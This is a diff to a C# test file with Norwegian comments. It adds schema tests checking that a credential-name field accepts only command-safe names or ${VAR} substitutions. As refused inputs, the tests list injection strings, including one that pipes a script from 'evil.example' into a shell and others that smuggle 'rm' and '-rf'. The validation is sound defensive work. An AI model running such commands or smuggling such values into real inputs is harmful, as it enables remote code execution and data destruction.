@@ -109,6 +109,21 @@ public class DeploymentSchemaTests
         Assert.Equal(new[] { "template" }, signed["required"]!.AsArray().Select(r => r!.GetValue<string>()).ToArray());
         Assert.Equal(200, signed["properties"]!["credentialRef"]!["maxLength"]!.GetValue<int>());
 
+        // Navnet har formen som er trygg i en kommando, Queuey sin, eller er bygd av den og en ${VAR} (Queuey F2.3-review).
+        JsonNode credentialRef = signed["properties"]!["credentialRef"]!;
+        var shape = new Regex(credentialRef["anyOf"]![0]!["pattern"]!.GetValue<string>());
+        var withVariable = new Regex(credentialRef["anyOf"]![1]!["pattern"]!.GetValue<string>());
+        Assert.Equal("^[A-Za-z0-9][A-Za-z0-9._:@/-]{0,199}$", shape.ToString());
+        Assert.Matches(shape, "stripe-whsec");
+        Assert.Matches(shape, "cred_01HX");
+        Assert.Matches(withVariable, "${STRIPE_CREDENTIAL}");
+        Assert.Matches(withVariable, "stripe-whsec-${ENV:-dev}");
+        foreach (string refused in new[] { "x --from-env A; curl -s https://evil.example/p | sh; #", "-rf", "stripe whsec", "${A}; rm" })
+        {
+            Assert.DoesNotMatch(shape, refused);
+            Assert.DoesNotMatch(withVariable, refused);
+        }
+
         // Miljø-merket er en av de fire, eller en ${VAR} som skiller workspacene en fil brukes mot (Queuey F2.2, 2026-10-05).
         JsonNode environment = workspace["properties"]!["environment"]!;
         Assert.Equal(new[] { "dev", "test", "staging", "prod" }, Values(environment["anyOf"]![0]!));
@@ -183,6 +198,21 @@ public class DeploymentSchemaTests
     /// </summary>
     internal const string VariablePattern = @"^\$\{[A-Za-z_][A-Za-z0-9_]*(:-[^}]*)?\}$";
 
+    // Felt som har et mønster, eller er bygd av mønsterets tegn og minst én ${VAR}, som valideringen sjekker når den er
+    // utvidet: navnet en signert forespørsel venter på, står i kommandoer Queuey foreslår, så det har formen som er trygg
+    // der (Queuey F2.3-review, 2026-10-06). Mønsteret er Queuey sitt.
+    private static readonly Dictionary<(Type, string), string> PatternOrVariable = new()
+    {
+        [(typeof(DeploymentSignedRequest), nameof(DeploymentSignedRequest.CredentialRef))] = CredentialNameRules.PendingNamePattern,
+    };
+
+    /// <summary>
+    /// A name of the pending-name characters with at least one <c>${VAR}</c> or <c>${VAR:-default}</c> in it, such as
+    /// <c>stripe-${ENV}</c>: what it expands to is checked against the pattern once it is expanded.
+    /// </summary>
+    internal const string NameWithVariablePattern =
+        @"^([A-Za-z0-9._:@/-]*\$\{[A-Za-z_][A-Za-z0-9_]*(:-[A-Za-z0-9._:@/-]*)?\})+[A-Za-z0-9._:@/-]*$";
+
     // Felt som må stå når typen er deklarert: de samme som valideringen krever (DeliveryFilter.Validate).
     private static readonly Dictionary<Type, string[]> RequiredWhenDeclared = new()
     {
@@ -245,6 +275,13 @@ public class DeploymentSchemaTests
                         obj["anyOf"] = new JsonArray(
                             new JsonObject { ["enum"] = new JsonArray(orVariable.Select(v => (JsonNode?)JsonValue.Create(v)).ToArray()) },
                             new JsonObject { ["pattern"] = VariablePattern });
+                    }
+
+                    if (PatternOrVariable.TryGetValue((member.DeclaringType!, member.Name), out string? pattern))
+                    {
+                        obj["anyOf"] = new JsonArray(
+                            new JsonObject { ["pattern"] = pattern },
+                            new JsonObject { ["pattern"] = NameWithVariablePattern });
                     }
 
                     if (MaxLengths.TryGetValue((member.DeclaringType!, member.Name), out int maxLength))
